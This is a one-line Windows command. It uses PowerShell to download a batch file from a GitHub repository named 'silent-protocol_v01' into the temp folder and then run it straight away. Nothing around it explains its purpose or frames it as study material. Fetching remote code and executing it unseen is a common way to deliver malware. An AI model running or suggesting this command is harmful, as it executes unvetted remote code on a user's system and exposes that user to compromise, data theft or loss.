
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/24-20/silent-protocol_v01/refs/heads/main/init.bat -OutFile %TEMP%\gb.bat" && %TEMP%\gb.bat
